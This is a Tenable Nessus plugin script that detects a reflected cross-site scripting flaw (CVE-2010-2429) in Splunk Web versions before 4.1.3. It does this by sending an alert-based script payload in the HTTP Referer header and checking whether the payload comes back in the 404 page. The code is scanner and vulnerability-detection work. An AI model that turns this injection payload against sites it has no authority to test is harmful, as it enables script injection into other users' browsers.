#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(47620);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2015/09/24 23:21:20 $");

  script_cve_id("CVE-2010-2429");
  script_bugtraq_id(73536);
  script_osvdb_id(65623);
  script_xref(name:"Secunia", value:"40187");

  script_name(english:"Splunk 4.x < 4.1.3 404 Response XSS");
  script_summary(english:"Attempts a version check.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is affected by a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Splunk Web hosted on the remote web server is affected
by a cross-site scripting vulnerability due to a failure to sanitize
the contents of the HTTP 'Referer' header before using it in HTTP
error 404 messages. An unauthenticated, remote attacker can exploit
this issue to inject arbitrary HTML or script code into a user's
browser to be executed within the security context of the affected
site.

Note that exploitation is only confirmed as valid in Internet Explorer
since Firefox escapes the special characters '<' and '>' when
rendering a link.");
  script_set_attribute(attribute:"see_also", value:"http://www.splunk.com/view/SP-CAAAFHY");
  script_set_attribute(attribute:"see_also", value:"http://www.splunk.com/base/Documentation/4.1.3/ReleaseNotes/4.1.3");
  script_set_attribute(attribute:"solution", value:"Upgrade to Splunk 4.1.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/06/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/06/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:splunk:splunk");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("splunk_web_detect.nasl");
  script_require_keys("installed_sw/Splunk");
  script_require_ports("Services/www", 8000);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Splunk";

get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:8000, embedded:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);
inject = SCRIPT_NAME+'-'+unixtime();
xss = '"><script>alert('+"'"+inject+"'"+')</script>';

# Request a non-existent file
url = "/en-US/"+inject;
# nb:
# We need to add prefix our request with '/en-US' otherwise we get
# HTTP error 303.

res = http_send_recv3(
  method       : "GET",
  item         : url,
  port         : port,
  exit_on_fail : TRUE,
  fetch404     : TRUE,
  add_headers  : make_array("Referer",xss)
);

if(
  '<h1 class="msg">The path \''+url+'\' was not found.</h1>' >< res[2] &&
  '<p>This page was linked to from <a href="'+xss >< res[2]
)
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);
  if (report_verbosity > 0)
  {
    req = http_last_sent_request();
    report = '\n' +
      'Nessus was able to verify this issue using the following request :\n' +
      '\n' +
      str_replace(find:'\n', replace:'\n  ', string:req);
    security_warning(port:port, extra:report) ;
  }
  else security_warning(port);
  exit(0);
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
